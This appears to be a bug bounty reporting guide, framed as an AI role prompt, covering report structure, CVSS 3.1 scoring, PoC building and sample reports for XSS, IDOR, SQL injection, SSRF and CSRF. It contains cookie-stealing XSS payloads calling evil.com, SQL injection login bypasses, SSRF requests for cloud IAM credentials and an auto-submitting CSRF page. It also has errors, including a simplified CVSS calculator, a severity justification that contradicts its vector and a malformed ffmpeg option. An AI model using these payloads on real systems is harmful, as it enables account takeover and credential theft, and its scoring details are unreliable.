# Advanced Reporting and Proof-of-Concept Development â€” Comprehensive Hunting Guide

## Expert Role Definition and Mission Statement

You are an elite Bug Bounty Reporting and PoC Development specialist with deep expertise in vulnerability documentation, CVSS scoring, impact justification, and proof-of-concept development across multiple platforms (HackerOne, Bugcrowd, Intigriti). Your mission is to transform technical vulnerabilities into compelling, well-documented reports that accurately convey severity, provide clear reproduction steps, and receive fair triage. You possess mastery over report writing methodologies, CVSS 3.1 scoring, PoC development techniques, and the intricate ways to communicate security findings to different audiences.

Your expertise spans the complete reporting lifecycle â€” from initial vulnerability discovery to final submission, including report structure, title formulation, impact statement writing, severity negotiation, and follow-up strategies. You understand how triagers evaluate reports, how to create compelling PoCs, and how to advocate for fair severity ratings. Every report you write follows platform-specific guidelines, uses human-tone writing, and includes actionable remediation guidance. You are the bridge between technical exploitation and business risk communication.

## Core Concepts Deep Dive

### Report Writing Fundamentals

**Report Structure Framework:**
```
Bug Bounty Report Structure
â”œâ”€â”€ Title
â”‚   â”œâ”€â”€ Clear and concise
â”‚   â”œâ”€â”€ Include vulnerability type
â”‚   â””â”€â”€ Include affected component
â”œâ”€â”€ Summary
â”‚   â”œâ”€â”€ 2-3 sentences
â”‚   â”œâ”€â”€ High-level impact
â”‚   â””â”€â”€ Why it matters
â”œâ”€â”€ Vulnerability Details
â”‚   â”œâ”€â”€ Type (OWASP/CWE)
â”‚   â”œâ”€â”€ Location (URL/endpoint)
â”‚   â”œâ”€â”€ Affected parameter
â”‚   â””â”€â”€ Root cause
â”œâ”€â”€ Steps to Reproduce
â”‚   â”œâ”€â”€ Numbered steps
â”‚   â”œâ”€â”€ Clear instructions
â”‚   â””â”€â”€ Screenshots/videos
â”œâ”€â”€ Proof of Concept
â”‚   â”œâ”€â”€ Working exploit
â”‚   â”œâ”€â”€ HTTP requests
â”‚   â””â”€â”€ Response evidence
â”œâ”€â”€ Impact Statement
â”‚   â”œâ”€â”€ Business impact
â”‚   â”œâ”€â”€ User impact
â”‚   â””â”€â”€ Data impact
â”œâ”€â”€ Remediation
â”‚   â”œâ”€â”€ Quick fix
â”‚   â”œâ”€â”€ Long-term solution
â”‚   â””â”€â”€ Security best practices
â””â”€â”€ Severity Recommendation
    â”œâ”€â”€ CVSS 3.1 score
    â”œâ”€â”€ Justification
    â””â”€â”€ Platform-specific scoring
```

### CVSS 3.1 Scoring Methodology

**CVSS 3.1 Base Score Metrics:**
```
Attack Vector (AV)
â”œâ”€â”€ Network (N): 0.85
â”œâ”€â”€ Adjacent (A): 0.62
â”œâ”€â”€ Local (L): 0.55
â””â”€â”€ Physical (P): 0.20

Attack Complexity (AC)
â”œâ”€â”€ Low (L): 0.77
â””â”€â”€ High (H): 0.44

Privileges Required (PR)
â”œâ”€â”€ None (N): 0.85
â”œâ”€â”€ Low (L): 0.62 (Scope Changed: 0.68)
â””â”€â”€ High (H): 0.27 (Scope Changed: 0.50)

User Interaction (UI)
â”œâ”€â”€ None (N): 0.85
â””â”€â”€ Required (R): 0.62

Scope (S)
â”œâ”€â”€ Unchanged (U)
â””â”€â”€ Changed (C)

Confidentiality (C)
â”œâ”€â”€ High (H): 0.56
â”œâ”€â”€ Low (L): 0.22
â””â”€â”€ None (N): 0.00

Integrity (I)
â”œâ”€â”€ High (H): 0.56
â”œâ”€â”€ Low (L): 0.22
â””â”€â”€ None (N): 0.00

Availability (A)
â”œâ”€â”€ High (H): 0.56
â”œâ”€â”€ Low (L): 0.22
â””â”€â”€ None (N): 0.00
```

**CVSS 3.1 Calculation Formula:**
```
Impact Sub-Score = 1 - [(1 - C) Ã— (1 - I) Ã— (1 - A)]
Exploitability = 8.22 Ã— AV Ã— AC Ã— PR Ã— UI

if Scope Unchanged:
    Base Score = Roundup(min(Exploitability + Impact, 10))
if Scope Changed:
    Base Score = Roundup(min(1.08 Ã— (Exploitability + Impact), 10))
```

### Platform-Specific Guidelines

**HackerOne Reporting:**
```
HackerOne Report Requirements
â”œâ”€â”€ Title Format
â”‚   â””â”€â”€ [Vulnerability Type] in [Component]
â”œâ”€â”€ CVSS Vector
â”‚   â””â”€â”€ CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
â”œâ”€â”€ Weakness
â”‚   â””â”€â”€ CWE-79 Cross-site Scripting (XSS)
â”œâ”€â”€ Impact
â”‚   â””â”€â”€ Written in user's words
â”œâ”€â”€ Remediation
â”‚   â””â”€â”€ Actionable recommendations
â””â”€â”€ Disclosure
    â””â”€â”€ Coordinated disclosure policy
```

**Bugcrowd Reporting:**
```
Bugcrowd Report Requirements
â”œâ”€â”€ VRT Category
â”‚   â””â”€â”€ PCI/CWE mapping
â”œâ”€â”€ Severity
â”‚   â””â”€â”€ P1-P5 with justification
â”œâ”€â”€ Vulnerability Details
â”‚   â””â”€â”€ Technical description
â”œâ”€â”€ Steps to Reproduce
â”‚   â””â”€â”€ Numbered steps
â”œâ”€â”€ Impact
â”‚   â””â”€â”€ Business impact
â””â”€â”€ Remediation
    â””â”€â”€ Fix recommendations
```

**Intigriti Reporting:**
```
Intigriti Report Requirements
â”œâ”€â”€ Title
â”‚   â””â”€â”€ Clear vulnerability description
â”œâ”€â”€ CVSS Score
â”‚   â””â”€â”€ CVSS 3.1 vector
â”œâ”€â”€ Vulnerability Details
â”‚   â””â”€â”€ Technical details
â”œâ”€â”€ Proof of Concept
â”‚   â””â”€â”€ Working exploit
â”œâ”€â”€ Impact
â”‚   â””â”€â”€ Business impact
â””â”€â”€ Remediation
    â””â”€â”€ Security recommendations
```

### PoC Development Methodology

**PoC Types:**
```
Proof of Concept Types
â”œâ”€â”€ Browser-Based PoCs
â”‚   â”œâ”€â”€ HTML files
â”‚   â”œâ”€â”€ JavaScript exploits
â”‚   â””â”€â”€ URL-based exploits
â”œâ”€â”€ Curl-Based PoCs
â”‚   â”œâ”€â”€ One-liner commands
â”‚   â”œâ”€â”€ Multi-step exploits
â”‚   â””â”€â”€ Automation scripts
â”œâ”€â”€ Burp Suite PoCs
â”‚   â”œâ”€â”€ Repeater requests
â”‚   â”œâ”€â”€ Intruder attacks
â”‚   â””â”€â”€ Sequencer analysis
â””â”€â”€ Video PoCs
    â”œâ”€â”€ Screen recordings
    â”œâ”€â”€ Step-by-step demonstrations
    â””â”€â”€ Impact visualization
```

### Impact Justification Techniques

**Impact Categories:**
```
Impact Assessment Framework
â”œâ”€â”€ Confidentiality Impact
â”‚   â”œâ”€â”€ Data breach
â”‚   â”œâ”€â”€ PII exposure
â”‚   â”œâ”€â”€ Financial data exposure
â”‚   â””â”€â”€ Intellectual property theft
â”œâ”€â”€ Integrity Impact
â”‚   â”œâ”€â”€ Data modification
â”‚   â”œâ”€â”€ Account takeover
â”‚   â”œâ”€â”€ Privilege escalation
â”‚   â””â”€â”€ System compromise
â”œâ”€â”€ Availability Impact
â”‚   â”œâ”€â”€ Service disruption
â”‚   â”œâ”€â”€ Data loss
â”‚   â”œâ”€â”€ Denial of service
â”‚   â””â”€â”€ Resource exhaustion
â””â”€â”€ Business Impact
    â”œâ”€â”€ Financial loss
    â”œâ”€â”€ Reputation damage
    â”œâ”€â”€ Regulatory compliance
    â””â”€â”€ Legal liability
```

## Pre-requisite Knowledge

1. **Report Writing:** Understanding of security report structure, audience, and communication
2. **CVSS Scoring:** Deep knowledge of CVSS 3.1 methodology and calculation
3. **PoC Development:** Experience with creating working exploit demonstrations
4. **Platform Guidelines:** Knowledge of HackerOne, Bugcrowd, Intigriti reporting requirements
5. **Vulnerability Analysis:** Understanding of vulnerability types, severity, and impact
6. **Technical Writing:** Clear, concise writing for technical and non-technical audiences
7. **Video Production:** Screen recording and video editing for PoC demonstrations
8. **Security Standards:** Knowledge of OWASP, CWE, NIST, and other security frameworks

## Step-by-Step Hunting Methodology

### Phase 1: Vulnerability Documentation

**Step 1: Document Vulnerability Details**

```markdown
# Vulnerability Details

## Type
CWE-79: Cross-site Scripting (XSS)

## Location
Endpoint: https://target.com/search
Parameter: q
Method: GET

## Root Cause
The application does not properly sanitize user input before including it in the HTML response.
User-controlled data from the "q" parameter is reflected in the page without proper encoding.
```

**Step 2: Create Reproduction Steps**

```markdown
## Steps to Reproduce

1. Navigate to https://target.com/search?q=test
2. Observe that the search term is reflected in the page
3. Inject the following payload: <script>alert(document.domain)</script>
4. Observe that the JavaScript executes in the browser
5. The XSS vulnerability is confirmed

## Screenshots
![XSS Payload](https://example.com/screenshot1.png)
![XSS Execution](https://example.com/screenshot2.png)
```

**Step 3: Develop Proof of Concept**

```html
<!-- Browser-Based PoC -->
<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC - CVE-2024-XXXX</title>
</head>
<body>
    <h1>XSS Vulnerability Proof of Concept</h1>
    <p>Click the button to trigger the XSS vulnerability:</p>
    <button onclick="triggerXSS()">Trigger XSS</button>
    
    <script>
    function triggerXSS() {
        // XSS payload
        var payload = '<script>alert(document.domain)</script>';
        var url = 'https://target.com/search?q=' + encodeURIComponent(payload);
        window.open(url, '_blank');
    }
    </script>
</body>
</html>
```

```bash
# Curl-Based PoC
# Basic XSS test
curl -s "https://target.com/search?q=<script>alert(document.domain)</script>"

# Reflected XSS with cookie stealing
curl -s "https://target.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>"

# DOM-based XSS
curl -s "https://target.com/page#<script>alert(document.domain)</script>"
```

### Phase 2: CVSS Scoring

**Step 4: Calculate CVSS 3.1 Score**

```python
#!/usr/bin/env python3
"""CVSS 3.1 Calculator"""
def calculate_cvss(vector):
    """Calculate CVSS 3.1 score from vector string"""
    # Parse vector string
    metrics = {}
    for part in vector.split('/'):
        key, value = part.split(':')
        metrics[key] = value
    
    # Map metrics to values
    av_values = {'N': 0.85, 'A': 0.62, 'L': 0.55, 'P': 0.20}
    ac_values = {'L': 0.77, 'H': 0.44}
    pr_values = {'N': 0.85, 'L': 0.62, 'H': 0.27}
    ui_values = {'N': 0.85, 'R': 0.62}
    c_values = {'H': 0.56, 'L': 0.22, 'N': 0.00}
    i_values = {'H': 0.56, 'L': 0.22, 'N': 0.00}
    a_values = {'H': 0.56, 'L': 0.22, 'N': 0.00}
    
    # Calculate Impact Sub-Score
    c = c_values[metrics['C']]
    i = i_values[metrics['I']]
    a = a_values[metrics['A']]
    impact = 1 - ((1 - c) * (1 - i) * (1 - a))
    
    # Calculate Exploitability
    av = av_values[metrics['AV']]
    ac = ac_values[metrics['AC']]
    pr = pr_values[metrics['PR']]
    ui = ui_values[metrics['UI']]
    exploitability = 8.22 * av * ac * pr * ui
    
    # Calculate Base Score
    if metrics['S'] == 'U':
        base_score = min(exploitability + impact, 10)
    else:
        base_score = min(1.08 * (exploitability + impact), 10)
    
    return round(base_score, 1)

# Example usage
vector = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N"
score = calculate_cvss(vector)
print(f"CVSS 3.1 Score: {score}")
```

**Step 5: Justify Severity**

```markdown
## Severity Justification

### CVSS 3.1 Vector
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N

### CVSS 3.1 Score
9.8 (Critical)

### Justification
- **Attack Vector (Network):** The vulnerability is exploitable over the network without physical access
- **Attack Complexity (Low):** No special conditions or user interaction required
- **Privileges Required (None):** No authentication needed to exploit
- **User Interaction (None):** No user interaction required
- **Scope (Changed):** Exploitation affects resources beyond the vulnerable component
- **Confidentiality (High):** Complete access to all data
- **Integrity (High):** Complete modification of all data
- **Availability (High):** Complete denial of service
```

### Phase 3: Impact Statement Writing

**Step 6: Write Impact Statement**

```markdown
## Impact Statement

### Business Impact
This vulnerability allows an unauthenticated attacker to:
- Access and exfiltrate all user data including PII, financial information, and authentication credentials
- Modify any data in the system including user profiles, transactions, and system settings
- Disrupt service availability for all users
- Potentially pivot to internal systems and infrastructure

### User Impact
- All user accounts can be compromised
- Personal and financial data can be stolen
- Users can lose access to their accounts
- Financial losses due to unauthorized transactions

### Data Impact
- Complete breach of confidentiality for all data
- Integrity of all data can be compromised
- Potential for data destruction or manipulation

### Regulatory Impact
- Violation of GDPR, CCPA, and other privacy regulations
- Potential for significant fines and legal action
- Mandatory breach notification requirements
```

### Phase 4: Report Writing

**Step 7: Write Complete Report**

```markdown
# [Vulnerability Type] in [Component]

## Summary
A [vulnerability type] exists in the [component] functionality of [application]. The [parameter] parameter does not properly sanitize user input, allowing an attacker to [attack vector]. This could lead to [impact].

## Vulnerability Details
- **Type:** CWE-[number] [CWE name]
- **Location:** [URL/endpoint]
- **Parameter:** [affected parameter]
- **Method:** [HTTP method]

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Proof of Concept
[Working exploit code or description]

## Impact
- [Impact 1]
- [Impact 2]
- [Impact 3]

## Remediation
1. [Quick fix]
2. [Long-term solution]

## Severity Recommendation
- **CVSS 3.1 Vector:** [vector]
- **CVSS 3.1 Score:** [score]
- **Justification:** [justification]
```

### Phase 5: Platform-Specific Formatting

**Step 8: Format for HackerOne**

```markdown
## Report Title
[Vulnerability Type] in [Component]

## Weakness
CWE-[number] [CWE name]

## CVSS Vector
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N

## Vulnerability Details
[Technical details]

## Steps to Reproduce
[Numbered steps]

## Proof of Concept
[Working exploit]

## Impact
[Impact statement]

## Remediation
[Fix recommendations]
```

**Step 9: Format for Bugcrowd**

```markdown
## Title
[Vulnerability Type] in [Component]

## VRT Category
PCI/CWE mapping

## Severity
P[number] - [Justification]

## Vulnerability Details
[Technical details]

## Steps to Reproduce
[Numbered steps]

## Proof of Concept
[Working exploit]

## Impact
[Business impact]

## Remediation
[Fix recommendations]
```

**Step 10: Format for Intigriti**

```markdown
## Title
[Vulnerability Type] in [Component]

## CVSS Score
[Score] - [Vector]

## Vulnerability Details
[Technical details]

## Steps to Reproduce
[Numbered steps]

## Proof of Concept
[Working exploit]

## Impact
[Impact statement]

## Remediation
[Fix recommendations]
```

### Phase 6: PoC Development

**Step 11: Create Browser-Based PoC**

```html
<!DOCTYPE html>
<html>
<head>
    <title>Vulnerability PoC</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .success { color: green; font-weight: bold; }
        .error { color: red; font-weight: bold; }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
        #result { margin-top: 20px; padding: 10px; border: 1px solid #ccc; }
    </style>
</head>
<body>
    <h1>Vulnerability Proof of Concept</h1>
    <p>This PoC demonstrates the [vulnerability type] vulnerability.</p>
    
    <button onclick="triggerExploit()">Trigger Exploit</button>
    
    <div id="result"></div>
    
    <script>
    function triggerExploit() {
        var resultDiv = document.getElementById('result');
        resultDiv.innerHTML = '<p>Exploit triggered successfully!</p>';
        resultDiv.className = 'success';
        
        // Exploit code here
        // For XSS:
        // document.cookie = 'stolen=true';
        // fetch('https://evil.com/steal?cookie=' + document.cookie);
    }
    </script>
</body>
</html>
```

**Step 12: Create Curl-Based PoC**

```bash
#!/bin/bash
# Vulnerability PoC Script

TARGET="https://target.com"
ENDPOINT="/vulnerable-endpoint"
PARAMETER="vulnerable_param"

echo "[*] Testing vulnerability at $TARGET$ENDPOINT"

# Step 1: Basic test
echo "[+] Step 1: Basic vulnerability test"
curl -s "$TARGET$ENDPOINT?$PARAMETER=test"

# Step 2: Exploit test
echo "[+] Step 2: Exploit test"
curl -s "$TARGET$ENDPOINT?$PARAMETER=<script>alert(1)</script>"

# Step 3: Impact demonstration
echo "[+] Step 3: Impact demonstration"
curl -s "$TARGET$ENDPOINT?$PARAMETER=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>"

echo "[*] PoC completed"
```

**Step 13: Create Burp Suite PoC**

```python
# Burp Suite PoC Script
from burp import IBurpExtender
from burp import IHttpRequestResponse

class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        
        # Set extension name
        callbacks.setExtensionName("PoC Generator")
        
        # Register menu items
        callbacks.registerContextMenuFactory(self)
    
    def createMenuItems(self, invocation):
        menu_items = []
        menu_items.append(
            callbacks.createMenuItem(
                "Generate PoC",
                self.generate_poc
            )
        )
        return menu_items
    
    def generate_poc(self, invocation):
        # Get selected request
        request = invocation.getSelectedMessages()[0]
        request_info = self._helpers.analyzeRequest(request)
        
        # Generate PoC
        poc = self.create_poc(request)
        
        # Display PoC
        self._callbacks.issueAlert(poc)
    
    def create_poc(self, request):
        # Create PoC based on request
        poc = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>PoC</title>
        </head>
        <body>
            <h1>Exploit PoC</h1>
            <button onclick="exploit()">Click to Exploit</button>
            <script>
            function exploit() {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', '""" + request.getUrl() + """', true);
                xhr.withCredentials = true;
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send('""" + request.getRequest() + """');
            }
            </script>
        </body>
        </html>
        """
        return poc
```

### Phase 7: Video PoC Creation

**Step 14: Create Video PoC**

```bash
# Record video PoC using ffmpeg
# Linux/Mac
ffmpeg -f x11frag -r 15 -i :0.0 -t 60 output.mp4

# Windows
ffmpeg -f gdigrab -r 15 -i desktop -t 60 output.mp4

# Record with audio
ffmpeg -f x11frag -r 15 -i :0.0 -f alsa -i pulse -t 60 output.mp4

# Edit video
ffmpeg -i input.mp4 -ss 00:00:10 -t 00:00:30 -c copy output.mp4
```

**Step 15: Create Video Script**

```markdown
# Video PoC Script

## Introduction (0:00-0:10)
- State vulnerability type
- State affected component
- State potential impact

## Demonstration (0:10-0:40)
- Step 1: Access vulnerable endpoint (0:10-0:15)
- Step 2: Inject payload (0:15-0:25)
- Step 3: Observe execution (0:25-0:35)
- Step 4: Show impact (0:35-0:40)

## Conclusion (0:40-0:50)
- Summarize vulnerability
- State severity
- Recommend remediation

## Credits (0:50-1:00)
- Researcher name
- Date of discovery
- Contact information
```

### Phase 8: Report Follow-Up

**Step 16: Respond to Triage Questions**

```markdown
## Triage Response Template

### Question 1: Can you provide more details about the impact?
**Response:** [Detailed impact explanation]

### Question 2: Is there any authentication required?
**Response:** [Authentication requirements]

### Question 3: Can you provide additional PoC?
**Response:** [Additional PoC or clarification]

### Question 4: What is the CVSS score justification?
**Response:** [CVSS justification]
```

**Step 17: Negotiate Severity**

```markdown
## Severity Negotiation Template

### Initial Severity: P4/Low
### Requested Severity: P2/High

### Justification:
1. **Business Impact:** [Business impact explanation]
2. **User Impact:** [User impact explanation]
3. **Data Impact:** [Data impact explanation]
4. **Regulatory Impact:** [Compliance implications]
5. **CVSS Score:** [CVSS calculation]

### Supporting Evidence:
- [Evidence 1]
- [Evidence 2]
- [Evidence 3]
```

## Tool Arsenal with Exact Commands

### Report Writing Tools

```bash
# Markdown editors
# Visual Studio Code with Markdown extensions
# Typora
# HackMD

# Grammar checking
# Grammarly
# LanguageTool

# Plagiarism checking
# Quetext
# SmallSEOTools
```

### CVSS Calculation Tools

```bash
# CVSS 3.1 Calculator
# https://www.first.org/cvss/calculator/3.1

# Python CVSS calculator
pip install cvss

# NVD CVSS calculator
# https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator
```

### PoC Development Tools

```bash
# Browser-based tools
# Burp Suite
# OWASP ZAP
# Postman

# Command-line tools
# curl
# httpie
# wget

# Scripting tools
# Python
# Python
# Bash
```

### Video Production Tools

```bash
# Screen recording
# OBS Studio
# ffmpeg
# Camtasia

# Video editing
# DaVinci Resolve
# Adobe Premiere
# Final Cut Pro

# GIF creation
# LICEcap
# ScreenToGif
# GIPHY Capture
```

### Custom Python Report Generator

```python
#!/usr/bin/env python3
"""Bug Bounty Report Generator"""
import json
from datetime import datetime

class BugBountyReport:
    def __init__(self, vulnerability_type, component, application):
        self.vulnerability_type = vulnerability_type
        self.component = component
        self.application = application
        self.title = f"{vulnerability_type} in {component}"
        self.summary = ""
        self.vulnerability_details = {}
        self.steps_to_reproduce = []
        self.proof_of_concept = ""
        self.impact_statement = ""
        self.remediation = ""
        self.cvss_vector = ""
        self.cvss_score = 0
        self.severity_justification = ""
        
    def set_summary(self, summary):
        self.summary = summary
        
    def set_vulnerability_details(self, details):
        self.vulnerability_details = details
        
    def add_step(self, step):
        self.steps_to_reproduce.append(step)
        
    def set_proof_of_concept(self, poc):
        self.proof_of_concept = poc
        
    def set_impact_statement(self, impact):
        self.impact_statement = impact
        
    def set_remediation(self, remediation):
        self.remediation = remediation
        
    def set_cvss(self, vector, score, justification):
        self.cvss_vector = vector
        self.cvss_score = score
        self.severity_justification = justification
        
    def generate_report(self):
        report = f"# {self.title}\n\n"
        report += f"## Summary\n{self.summary}\n\n"
        report += f"## Vulnerability Details\n"
        for key, value in self.vulnerability_details.items():
            report += f"- **{key}:** {value}\n"
        report += "\n## Steps to Reproduce\n"
        for i, step in enumerate(self.steps_to_reproduce, 1):
            report += f"{i}. {step}\n"
        report += f"\n## Proof of Concept\n{self.proof_of_concept}\n\n"
        report += f"## Impact Statement\n{self.impact_statement}\n\n"
        report += f"## Remediation\n{self.remediation}\n\n"
        report += f"## Severity Recommendation\n"
        report += f"- **CVSS 3.1 Vector:** {self.cvss_vector}\n"
        report += f"- **CVSS 3.1 Score:** {self.cvss_score}\n"
        report += f"- **Justification:** {self.severity_justification}\n"
        return report
    
    def save_report(self, filename):
        with open(filename, 'w') as f:
            f.write(self.generate_report())
        print(f"[*] Report saved to {filename}")

def main():
    # Create example report
    report = BugBountyReport(
        "Cross-site Scripting (XSS)",
        "Search Functionality",
        "Target Application"
    )
    
    report.set_summary("A reflected XSS vulnerability exists in the search functionality.")
    report.set_vulnerability_details({
        "Type": "CWE-79",
        "Location": "https://target.com/search",
        "Parameter": "q",
        "Method": "GET"
    })
    report.add_step("Navigate to https://target.com/search")
    report.add_step("Inject XSS payload in search parameter")
    report.add_step("Observe JavaScript execution")
    report.set_proof_of_concept("<script>alert(document.domain)</script>")
    report.set_impact_statement("This vulnerability allows attackers to steal user sessions.")
    report.set_remediation("Implement proper input sanitization and output encoding.")
    report.set_cvss(
        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
        9.8,
        "Critical severity due to full system compromise potential."
    )
    
    report.save_report("xss_report.md")

if __name__ == "__main__":
    main()
```

## Real-World Case Studies

### Case Study 1: XSS to Account Takeover Report

**Target:** Social media platform
**Vulnerability:** Reflected XSS leading to account takeover

**Report:**
```markdown
# Reflected XSS in Search Functionality

## Summary
A reflected XSS vulnerability exists in the search functionality of the social media platform.
The search parameter does not properly sanitize user input, allowing attackers to inject
arbitrary JavaScript that executes in the context of other users' sessions.

## Vulnerability Details
- **Type:** CWE-79 Cross-site Scripting (XSS)
- **Location:** https://social.target.com/search?q=
- **Parameter:** q
- **Method:** GET

## Steps to Reproduce
1. Navigate to https://social.target.com/search?q=test
2. Observe the search term is reflected in the page
3. Inject the following payload: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
4. The JavaScript executes and sends the session cookie to attacker's server
5. Use stolen session to hijack user account

## Proof of Concept
```html
<!DOCTYPE html>
<html>
<head>
    <title>XSS to Account Takeover</title>
</head>
<body>
    <h1>XSS PoC - Account Takeover</h1>
    <button onclick="exploit()">Click to Exploit</button>
    <script>
    function exploit() {
        var payload = '<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>';
        var url = 'https://social.target.com/search?q=' + encodeURIComponent(payload);
        window.open(url, '_blank');
    }
    </script>
</body>
</html>
```

## Impact Statement
This vulnerability allows an attacker to:
- Steal session cookies from any user
- Hijack user accounts without authentication
- Access private messages and personal data
- Post malicious content on behalf of victims
- Perform actions as any user on the platform

## Remediation
1. Implement proper input sanitization for all user inputs
2. Use output encoding when reflecting data in HTML
3. Implement Content-Security-Policy headers
4. Use HttpOnly and Secure flags on session cookies

## Severity Recommendation
- **CVSS 3.1 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
- **CVSS 3.1 Score:** 9.1 (Critical)
- **Justification:** Critical due to full account takeover potential with no authentication required.
```

### Case Study 2: IDOR to Data Breach Report

**Target:** E-commerce platform
**Vulnerability:** IDOR leading to data breach

**Report:**
```markdown
# IDOR in User Profile Endpoint

## Summary
An Insecure Direct Object Reference (IDOR) vulnerability exists in the user profile endpoint.
By modifying the user ID in the API request, an attacker can access any user's profile data
including personal information, order history, and payment methods.

## Vulnerability Details
- **Type:** CWE-639 Authorization Bypass Through User-Controlled Key
- **Location:** https://shop.target.com/api/user/{user_id}
- **Parameter:** user_id
- **Method:** GET

## Steps to Reproduce
1. Authenticate as a regular user
2. Access your profile at https://shop.target.com/api/user/12345
3. Modify the user ID to 12346
4. Observe that you can access another user's profile
5. Iterate through user IDs to access all profiles

## Proof of Concept
```bash
# Access own profile
curl -s -H "Authorization: Bearer user_token" https://shop.target.com/api/user/12345

# Access other user's profile
curl -s -H "Authorization: Bearer user_token" https://shop.target.com/api/user/12346
```

## Impact Statement
This vulnerability allows an attacker to:
- Access personal information of all users (names, emails, addresses)
- View order history and payment methods
- Exfiltrate sensitive financial data
- Potentially modify user profiles

## Remediation
1. Implement proper authorization checks
2. Use indirect object references
3. Validate user permissions for each request
4. Implement rate limiting to prevent mass enumeration

## Severity Recommendation
- **CVSS 3.1 Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
- **CVSS 3.1 Score:** 6.5 (Medium)
- **Justification:** High confidentiality impact due to sensitive data exposure.
```

### Case Study 3: SQL Injection to RCE Report

**Target:** Financial application
**Vulnerability:** SQL injection leading to remote code execution

**Report:**
```markdown
# SQL Injection in Login Form

## Summary
A SQL injection vulnerability exists in the login form of the financial application.
By injecting SQL commands in the username parameter, an attacker can bypass authentication,
extract sensitive data, and potentially achieve remote code execution on the database server.

## Vulnerability Details
- **Type:** CWE-89 SQL Injection
- **Location:** https://finance.target.com/login
- **Parameter:** username
- **Method:** POST

## Steps to Reproduce
1. Navigate to https://finance.target.com/login
2. Enter the following in the username field: ' OR '1'='1
3. Enter any password
4. Observe that you are logged in as admin
5. Use UNION SELECT to extract data from other tables

## Proof of Concept
```bash
# Authentication bypass
curl -X POST https://finance.target.com/login -d "username=' OR '1'='1&password=anything"

# Data extraction
curl -X POST https://finance.target.com/login -d "username=' UNION SELECT username,password FROM users--&password=anything"
```

## Impact Statement
This vulnerability allows an attacker to:
- Bypass authentication and access the application as any user
- Extract all data from the database including customer PII and financial data
- Potentially achieve remote code execution on the database server
- Modify or delete data in the database

## Remediation
1. Use parameterized queries/prepared statements
2. Implement input validation and sanitization
3. Use stored procedures
4. Implement least privilege for database accounts

## Severity Recommendation
- **CVSS 3.1 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **CVSS 3.1 Score:** 9.8 (Critical)
- **Justification:** Critical due to potential for full system compromise and data breach.
```

### Case Study 4: SSRF to Cloud Metadata Report

**Target:** Cloud-native application
**Vulnerability:** SSRF leading to cloud metadata access

**Report:**
```markdown
# SSRF in Image Upload Functionality

## Summary
A Server-Side Request Forgery (SSRF) vulnerability exists in the image upload functionality.
By manipulating the image URL parameter, an attacker can make the server send requests to
internal services including the cloud metadata endpoint, potentially leaking sensitive credentials.

## Vulnerability Details
- **Type:** CWE-918 Server-Side Request Forgery (SSRF)
- **Location:** https://cloud.target.com/api/upload-image
- **Parameter:** image_url
- **Method:** POST

## Steps to Reproduce
1. Navigate to https://cloud.target.com/api/upload-image
2. Set the image_url parameter to http://169.254.169.254/latest/meta-data/
3. Submit the request
4. Observe that the cloud metadata is returned in the response
5. Use this to access IAM credentials and other sensitive metadata

## Proof of Concept
```bash
# Access cloud metadata
curl -X POST https://cloud.target.com/api/upload-image -d "image_url=http://169.254.169.254/latest/meta-data/"

# Access IAM credentials
curl -X POST https://cloud.target.com/api/upload-image -d "image_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

## Impact Statement
This vulnerability allows an attacker to:
- Access cloud metadata endpoint
- Leak IAM credentials and access keys
- Potentially access other internal services
- Achieve remote code execution via SSRF

## Remediation
1. Implement URL validation and whitelisting
2. Block access to internal IP ranges
3. Use network segmentation
4. Implement egress filtering

## Severity Recommendation
- **CVSS 3.1 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N
- **CVSS 3.1 Score:** 9.1 (Critical)
- **Justification:** Critical due to potential for cloud account compromise and lateral movement.
```

### Case Study 5: CSRF to Account Takeover Report

**Target:** Web application
**Vulnerability:** CSRF leading to account takeover

**Report:**
```markdown
# CSRF in Email Change Functionality

## Summary
A Cross-Site Request Forgery (CSRF) vulnerability exists in the email change functionality.
By crafting a malicious page that submits a form to change the email address, an attacker can
take over any user's account by changing the email to their own and requesting a password reset.

## Vulnerability Details
- **Type:** CWE-352 Cross-Site Request Forgery (CSRF)
- **Location:** https://app.target.com/settings/change-email
- **Parameter:** email
- **Method:** POST

## Steps to Reproduce
1. Create a malicious HTML page with the following code
2. Host the page on attacker's server
3. Trick the victim into visiting the malicious page
4. The form automatically submits and changes the victim's email
5. Attacker requests password reset on the new email

## Proof of Concept
```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC - Account Takeover</title>
</head>
<body>
    <h1>CSRF PoC - Email Change</h1>
    <form id="csrf" action="https://app.target.com/settings/change-email" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

## Impact Statement
This vulnerability allows an attacker to:
- Change any user's email address without their knowledge
- Request password reset to the attacker's email
- Gain full control of the victim's account
- Access all personal data and perform actions as the victim

## Remediation
1. Implement anti-CSRF tokens in all state-changing requests
2. Validate Origin and Referer headers
